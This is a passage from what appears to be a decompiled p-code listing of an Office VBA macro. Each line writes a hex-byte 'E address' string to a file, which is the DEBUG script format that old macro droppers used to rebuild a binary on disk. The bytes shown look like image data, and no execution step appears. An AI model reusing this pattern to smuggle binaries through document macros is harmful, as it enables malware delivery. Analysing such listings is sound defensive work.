' 	LitStr 0x0036 "E 73A0 39 1E 2B 41 27 32 48 15 20 34 00 00 11 00 00 12"
' 	PrintItemNL 
' Line #2045:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 73B0 05 0C 20 20 28 3F 54 5D 78 60 6E 8B 5E 6E 92 50"
' 	PrintItemNL 
' Line #2046:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 73C0 63 89 54 66 8F 64 76 9F 66 76 A0 5C 68 98 28 2A"
' 	PrintItemNL 
' Line #2047:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 73D0 6A 38 36 7C 45 42 8A 4D 4A 92 52 4F 97 51 50 98"
' 	PrintItemNL 
' Line #2048:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 73E0 4A 4A 90 41 42 86 16 18 58 1C 22 5D 2D 34 6D 46"
' 	PrintItemNL 
' Line #2049:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 73F0 4D 84 5B 63 98 65 6E A0 61 6B 9B 59 66 94 53 63"
' 	PrintItemNL 
' Line #2050:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7400 8D 57 69 92 5E 6F 9A 62 72 A0 5B 6D 9C 52 63 94"
' 	PrintItemNL 
' Line #2051:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7410 4C 5D 90 4C 5D 8E 46 58 87 40 53 7E 25 38 5E 25"
' 	PrintItemNL 
' Line #2052:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7420 3A 5A 2C 3E 5B 2E 43 59 1F 33 45 0F 24 39 34 4A"
' 	PrintItemNL 
' Line #2053:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7430 63 3B 52 6C 42 5A 72 54 6C 84 4C 64 7A 49 62 76"
' 	PrintItemNL 
' Line #2054:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7440 3B 54 68 4F 69 7A 55 6F 80 4D 67 78 66 80 91 95"
' 	PrintItemNL 
' Line #2055:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7450 AF C0 61 7A 8E 3A 53 67 2A 43 57 3F 58 6C 53 6E"
' 	PrintItemNL 
' Line #2056:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7460 83 74 8F A4 5C 75 89 40 59 6D 60 78 8C 60 78 8C"
' 	PrintItemNL 
' Line #2057:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7470 52 6B 7F 53 6E 82 4A 66 77 42 60 71 6D 8A 99 6A"
' 	PrintItemNL 
' Line #2058:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7480 84 94 72 8B 9B 96 AA BB 96 A8 B9 8F A0 B3 87 9A"
' 	PrintItemNL 
' Line #2059:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7490 AF 94 A5 BA 92 9E B0 49 52 60 3F 48 56 00 00 0A"
' 	PrintItemNL 
' Line #2060:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 74A0 00 00 F8 F7 F9 EC EC EC E1 E1 E1 D1 D1 D1 C4 C4"
' 	PrintItemNL 
' Line #2061:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 74B0 C4 B4 B6 B7 00 00 03 EA F2 F9 DF EB F7 AE BE CE"
' 	PrintItemNL 
' Line #2062:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 74C0 A6 BA CC D5 EA FF BB D0 E5 8D A2 B7 A1 B7 C9 9D"
' 	PrintItemNL 
' Line #2063:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 74D0 B5 C9 73 8D A5 49 63 7B 48 60 78 40 57 6D 65 7A"
' 	PrintItemNL 
' Line #2064:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 74E0 8F 5B 70 85 54 69 7E 3E 53 69 3A 50 69 3D 52 6D"
' 	PrintItemNL 
' Line #2065:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 74F0 35 4C 66 25 3C 56 31 45 5E 28 3D 53 1F 2F 46 12"
' 	PrintItemNL 
' Line #2066:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7500 23 38 20 2E 44 25 33 46 27 33 45 13 1F 31 00 00"
' 	PrintItemNL 
' Line #2067:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7510 0D 00 00 0D 00 06 19 1D 25 3C 56 61 7C 68 76 93"
' 	PrintItemNL 
' Line #2068:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7520 6A 7A 9E 57 69 8E 58 69 90 6E 7E A8 5F 6F 99 33"
' 	PrintItemNL 
' Line #2069:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7530 3F 6F 4C 4E 8E 5B 58 A0 53 50 98 33 30 78 1F 1C"
' 	PrintItemNL 
' Line #2070:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7540 64 29 26 6E 3B 3B 81 44 45 89 64 66 A7 4B 4E 8B"
' 	PrintItemNL 
' Line #2071:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7550 31 37 72 33 3A 71 4B 53 88 5D 66 98 5C 66 96 51"
' 	PrintItemNL 
' Line #2072:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7560 5E 8C 47 57 81 5C 6E 97 6D 7E A9 6B 7B AA 5D 6E"
' 	PrintItemNL 
' Line #2073:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7570 9F 55 66 99 51 61 96 4E 5E 93 48 59 8A 44 57 84"
' 	PrintItemNL 
' Line #2074:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7580 27 39 62 27 3B 5E 2C 3E 5B 2D 42 58 20 34 46 10"
' 	PrintItemNL 
' Line #2075:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7590 26 38 2D 43 5C 35 4C 66 3A 52 6A 58 70 88 51 69"
' 	PrintItemNL 
' Line #2076:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 75A0 7F 4A 63 77 3C 55 69 4F 69 7A 50 6A 7B 50 6A 7B"
' 	PrintItemNL 
' Line #2077:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 75B0 6E 88 99 9C B6 C7 4C 65 79 30 49 5D 2D 46 5A 4A"
' 	PrintItemNL 
' Line #2078:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 75C0 63 77 61 7C 91 72 8D A2 4A 63 77 40 59 6D 75 8D"
' 	PrintItemNL 
' Line #2079:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 75D0 A1 6D 85 99 55 6E 82 41 5C 70 40 5C 6D 45 63 74"
' 	PrintItemNL 
' Line #2080:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 75E0 70 8D 9C 5E 78 88 72 8B 9B 9B AF C0 93 A5 B6 93"
' 	PrintItemNL 
' Line #2081:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 75F0 A2 B5 7D 8B A1 AB B9 CC 70 77 88 40 46 53 51 57"
' 	PrintItemNL 
' Line #2082:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7600 64 00 00 08 00 00 F6 F6 F6 EA EA EA E1 DF DF D0"
' 	PrintItemNL 
' Line #2083:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7610 CE CD C3 C3 C3 B7 B9 BA 00 00 03 DF E7 EE DF EB"
' 	PrintItemNL 
' Line #2084:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7620 F7 BE CD DD AB BD CE CD E1 F3 D4 E9 FE A5 BA CF"
' 	PrintItemNL 
' Line #2085:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7630 94 A8 BA A5 BA CF 78 92 AA 52 6C 84 41 59 71 4A"
' 	PrintItemNL 
' Line #2086:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7640 61 77 4D 62 77 68 7D 92 50 65 7A 4A 5F 75 37 4D"
' 	PrintItemNL 
' Line #2087:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7650 66 3B 50 6B 35 4C 66 24 3B 55 2E 42 5B 24 39 4F"
' 	PrintItemNL 
' Line #2088:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7660 22 32 49 20 31 46 1A 2B 3E 25 35 46 1F 2E 3E 0A"
' 	PrintItemNL 
' Line #2089:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7670 17 25 00 05 12 00 01 0F 00 00 0F 2D 38 4E 5B 68"
' 	PrintItemNL 
' Line #2090:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7680 82 71 7E 9E 70 7E A2 51 61 86 46 55 7C 3F 4E 75"
' 	PrintItemNL 
' Line #2091:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7690 2D 3C 63 32 3C 6B 3E 42 7D 28 27 69 11 10 52 17"
' 	PrintItemNL 
' Line #2092:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 76A0 16 58 22 21 63 15 15 55 03 05 45 05 08 45 14 18"
' 	PrintItemNL 
' Line #2093:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 76B0 53 29 2D 67 28 2F 66 1B 24 56 1E 28 58 2C 36 65"
' 	PrintItemNL 
' Line #2094:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 76C0 36 41 6D 3B 49 73 4E 5F 86 58 6A 93 65 76 A1 68"
' 	PrintItemNL 
' Line #2095:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 76D0 78 A7 5F 70 A1 55 66 99 4D 5D 92 4A 5A 8F 41 52"
' 	PrintItemNL 
' Line #2096:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 76E0 85 3B 4D 7C 29 3B 64 1D 31 54 28 3A 57 2B 40 56"
' 	PrintItemNL 
' Line #2097:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 76F0 23 37 49 1A 30 42 25 3B 54 35 4C 66 31 49 61 53"
' 	PrintItemNL 
' Line #2098:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7700 6B 83 53 6B 81 4A 63 77 3C 55 69 4B 65 76 48 62"
' 	PrintItemNL 
' Line #2099:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7710 73 4A 64 75 79 93 A4 74 8E 9F 3A 53 67 39 52 66"
' 	PrintItemNL 
' Line #2100:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7720 2E 47 5B 55 6E 82 61 7C 91 79 94 A9 46 5F 73 5C"
' 	PrintItemNL 
' Line #2101:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7730 75 89 68 80 94 49 61 75 66 7F 93 51 6C 80 38 54"
' 	PrintItemNL 
' Line #2102:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7740 65 5F 7D 8E 6D 8A 99 5F 79 89 7B 94 A4 9A AE BF"
' 	PrintItemNL 
' Line #2103:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7750 8E A0 B1 88 96 A8 99 A4 B8 79 80 93 50 53 62 5D"
' 	PrintItemNL 
' Line #2104:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7760 5D 69 53 53 5F 00 00 08 00 00 F6 F6 F6 EA EA EA"
' 	PrintItemNL 
' Line #2105:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7770 E1 DF DE D0 CE CD C3 C3 C3 B7 B9 B9 00 00 03 DF"
' 	PrintItemNL 
' Line #2106:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7780 E7 EE E8 F4 FF D2 E1 F1 A7 B9 CA B2 C6 D8 D6 EB"
' 	PrintItemNL 
' Line #2107:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7790 FF C2 D8 EA 9F B3 C5 95 AA BF 81 9B B3 56 70 88"
' 	PrintItemNL 
' Line #2108:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 77A0 3F 57 6F 40 57 6D 40 55 6A 65 7A 8F 52 67 7C 45"
' 	PrintItemNL 
' Line #2109:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 77B0 5A 70 35 4B 64 3A 4F 6A 33 4A 64 23 3A 54 2F 43"
' 	PrintItemNL 
' Line #2110:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 77C0 5C 24 39 4F 20 30 47 1E 2F 42 13 27 39 21 34 43"
' 	PrintItemNL 
' Line #2111:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 77D0 20 30 3C 01 0D 17 00 00 08 00 00 0A 00 00 0D 34"
' 	PrintItemNL 
' Line #2112:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 77E0 41 57 5C 6A 86 70 7F 9F 72 80 A4 57 64 8A 3F 4B"
' 	PrintItemNL 
' Line #2113:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 77F0 73 2B 37 5F 1A 26 4E 19 24 50 21 26 5D 1E 1F 5B"
' 	PrintItemNL 
' Line #2114:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7800 24 25 61 3B 3D 77 43 45 7F 26 2A 64 0B 0F 49 0B"
' 	PrintItemNL 
' Line #2115:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7810 0F 49 0C 11 48 0D 14 4B 09 12 44 08 12 42 12 1C"
' 	PrintItemNL 
' Line #2116:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7820 4B 23 2F 59 3E 4A 72 59 68 8F 4B 5C 83 57 69 92"
' 	PrintItemNL 
' Line #2117:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7830 64 74 A2 68 78 A7 5E 6F A0 54 65 98 4D 5D 92 4B"
' 	PrintItemNL 
' Line #2118:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7840 5B 90 43 54 87 39 4B 7A 2A 3C 65 25 39 5C 2E 40"
' 	PrintItemNL 
' Line #2119:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7850 5D 29 3E 54 1E 32 44 16 2C 3E 1D 33 4C 31 48 62"
' 	PrintItemNL 
' Line #2120:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7860 2F 47 5F 50 68 80 52 6A 80 4E 67 7B 42 5B 6F 51"
' 	PrintItemNL 
' Line #2121:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7870 6B 7C 44 5E 6F 4D 67 78 7A 94 A5 6C 86 97 3C 55"
' 	PrintItemNL 
' Line #2122:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7880 69 37 50 64 32 4B 5F 56 6F 83 72 8D A2 7B 96 AB"
' 	PrintItemNL 
' Line #2123:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7890 49 62 76 58 71 85 5D 75 89 48 60 74 67 80 94 4A"
' 	PrintItemNL 
' Line #2124:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 78A0 65 79 46 62 73 5B 79 8A 63 80 8F 62 7C 8C 80 99"
' 	PrintItemNL 
' Line #2125:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 78B0 A9 97 AB BC 8C 9E AF 91 9F B1 8C 94 A5 48 4D 5C"
' 	PrintItemNL 
' Line #2126:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 78C0 55 53 5F 43 3F 4A 3C 38 43 06 03 0C 00 00 F8 F6"
' 	PrintItemNL 
' Line #2127:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 78D0 F6 ED EB EB E2 E0 DF D1 CF CE C5 C3 C2 B9 B9 B9"
' 	PrintItemNL 
' Line #2128:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 78E0 00 00 03 E1 EA EE DD E9 F3 E4 F4 FF B0 C2 D3 9D"
' 	PrintItemNL 
' Line #2129:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 78F0 B1 C3 C8 DC EE CC E0 F2 A9 BD CF 93 A9 BB 8F A9"
' 	PrintItemNL 
' Line #2130:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7900 C1 61 7B 93 42 5A 72 37 4E 64 34 49 5E 65 7A 8F"
' 	PrintItemNL 
' Line #2131:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7910 57 6C 81 41 56 6C 33 49 62 38 4D 68 32 49 63 23"
' 	PrintItemNL 
' Line #2132:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7920 3A 54 31 45 5E 23 38 4E 1D 2D 44 1B 2C 3F 21 35"
' 	PrintItemNL 
' Line #2133:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7930 47 20 33 42 18 26 32 00 05 0D 00 04 0C 00 09 13"
' 	PrintItemNL 
' Line #2134:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7940 00 01 11 35 43 59 64 74 91 66 75 96 61 6F 93 63"
' 	PrintItemNL 
' Line #2135:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7950 6E 94 66 71 97 62 6D 93 57 63 8B 4B 56 82 51 58"
' 	PrintItemNL 
' Line #2136:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7960 8A 55 5B 90 60 66 9B 71 78 AA 76 7D AF 67 6E A0"
' 	PrintItemNL 
' Line #2137:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7970 5B 62 94 5D 66 98 55 5D 92 4F 58 8A 49 52 84 4C"
' 	PrintItemNL 
' Line #2138:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7980 59 87 51 5E 8A 52 60 8A 5F 6F 94 75 85 AA 54 65"
' 	PrintItemNL 
' Line #2139:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7990 8C 5C 6E 97 65 75 A3 66 76 A5 5C 6D 9E 52 63 96"
' 	PrintItemNL 
' Line #2140:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 79A0 4B 5B 90 48 58 8D 43 54 87 36 48 77 29 3B 64 28"
' 	PrintItemNL 
' Line #2141:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 79B0 3C 5F 31 43 60 2A 3E 57 1F 32 47 1A 2F 44 19 2F"
' 	PrintItemNL 
' Line #2142:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 79C0 48 31 48 62 2F 47 5F 4D 65 7D 4E 66 7C 4F 68 7C"
' 	PrintItemNL 
' Line #2143:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 79D0 45 5E 72 52 6C 7D 3F 59 6A 51 6B 7C 79 93 A4 5D"
' 	PrintItemNL 
' Line #2144:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 79E0 77 88 3E 57 6B 33 4C 60 38 51 65 59 72 86 7E 99"
' 	PrintItemNL 
' Line #2145:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 79F0 AE 71 8C A1 4B 64 78 5A 73 87 57 6F 83 4E 66 7A"
' 	PrintItemNL 
' Line #2146:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7A00 69 82 96 41 5C 70 51 6D 7E 5A 78 89 61 7E 8D 6D"
' 	PrintItemNL 
' Line #2147:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7A10 87 97 8B A4 B4 96 AA BB 89 9B AC 94 A1 B1 5C 63"
' 	PrintItemNL 
' Line #2148:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7A20 72 5B 5C 6A 48 42 4D 30 29 30 2B 27 2D 02 00 04"
' 	PrintItemNL 
' Line #2149:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7A30 00 00 F8 F6 F6 ED EB EA E2 E0 DF D1 CF CE C5 C3"
' 	PrintItemNL 
' Line #2150:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7A40 C2 B9 B9 B9 00 00 01 E5 EB F0 DC E6 F0 EC FC FF"
' 	PrintItemNL 
' Line #2151:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7A50 C1 D3 E4 9F B3 C5 BA CE E0 CD E1 F3 BC D0 E1 A1"
' 	PrintItemNL 
' Line #2152:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7A60 B7 C9 95 AF C7 70 8A A2 4A 62 7A 33 4A 60 33 48"
' 	PrintItemNL 
' Line #2153:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7A70 5D 6B 80 95 5B 70 85 43 58 6E 31 47 60 38 4D 68"
' 	PrintItemNL 
' Line #2154:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7A80 30 47 61 23 3A 54 33 47 60 22 37 4D 19 29 40 19"
' 	PrintItemNL 
' Line #2155:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7A90 2A 3F 31 42 55 1D 2D 3D 12 1E 28 00 0B 13 17 23"
' 	PrintItemNL 
' Line #2156:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7AA0 29 1F 2B 35 0F 1D 2F 49 58 72 63 72 92 62 72 96"
' 	PrintItemNL 
' Line #2157:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7AB0 65 72 98 72 7C A4 72 7C A4 6F 7B A3 7C 88 B0 7C"
' 	PrintItemNL 
' Line #2158:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7AC0 88 B2 7D 87 B6 7A 81 B2 6E 75 A6 64 6C 9B 67 6F"
' 	PrintItemNL 
' Line #2159:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7AD0 9E 6F 79 A8 76 80 AF 79 83 B3 7D 86 B8 7A 85 B7"
' 	PrintItemNL 
' Line #2160:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7AE0 75 80 B2 6D 79 A9 66 73 A1 62 70 9A 67 76 9D 6D"
' 	PrintItemNL 
' Line #2161:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7AF0 7E A5 65 77 A0 63 74 9F 60 70 9F 5C 6B 9C 55 66"
' 	PrintItemNL 
' Line #2162:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7B00 99 4D 5E 91 46 56 8B 40 51 84 3F 50 81 31 43 72"
' 	PrintItemNL 
' Line #2163:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7B10 26 38 61 25 38 5D 2F 41 60 2E 42 5B 29 3B 52 22"
' 	PrintItemNL 
' Line #2164:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7B20 37 4D 1C 32 4B 35 4C 66 32 4A 62 4A 62 7A 4A 62"
' 	PrintItemNL 
' Line #2165:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7B30 78 4C 65 79 43 5C 70 4E 68 79 3D 57 68 57 71 82"
' 	PrintItemNL 
' Line #2166:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7B40 73 8D 9E 4C 66 77 3F 58 6C 33 4C 60 42 5B 6F 5F"
' 	PrintItemNL 
' Line #2167:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7B50 78 8C 7A 95 AA 5B 76 8B 4B 64 78 62 7B 8F 5A 72"
' 	PrintItemNL 
' Line #2168:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7B60 86 5A 72 86 6D 86 9A 3F 5A 6E 47 63 74 57 75 86"
' 	PrintItemNL 
' Line #2169:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7B70 63 80 8F 71 8B 9B 89 A2 B2 8D A1 B2 7C 8E 9F 7C"
' 	PrintItemNL 
' Line #2170:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7B80 89 99 75 7B 88 50 4F 59 4C 45 4C 56 4F 54 56 50"
' 	PrintItemNL 
' Line #2171:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7B90 55 06 01 03 00 00 F8 F6 F5 ED EB EA E5 E1 E0 D3"
' 	PrintItemNL 
' Line #2172:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7BA0 D0 CC C4 C2 C1 B9 B9 B9 00 00 01 E7 ED F2 E1 EB"
' 	PrintItemNL 
' Line #2173:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7BB0 F5 E6 F3 FF C7 D7 E7 A8 BA CB AD C1 D3 C9 DD EF"
' 	PrintItemNL 
' Line #2174:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7BC0 CA DC ED 9E B4 C6 90 AA C2 7A 94 AC 52 6A 82 31"
' 	PrintItemNL 
' Line #2175:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7BD0 48 5E 35 4A 5F 6D 82 97 58 6D 82 44 59 6F 32 48"
' 	PrintItemNL 
' Line #2176:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7BE0 61 38 4D 68 2E 45 5F 22 39 53 34 48 61 21 36 4C"
' 	PrintItemNL 
' Line #2177:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7BF0 14 24 3B 16 27 3C 2F 3D 53 17 25 37 0D 16 23 00"
' 	PrintItemNL 
' Line #2178:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7C00 07 10 07 11 18 04 0E 18 06 14 27 42 53 6E 55 65"
' 	PrintItemNL 
' Line #2179:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7C10 89 57 66 8D 62 70 9A 77 83 AD 75 81 AB 6E 7A A4"
' 	PrintItemNL 
' Line #2180:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7C20 73 83 AD 71 81 AC 6B 76 A2 5C 67 93 45 50 7C 37"
' 	PrintItemNL 
' Line #2181:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
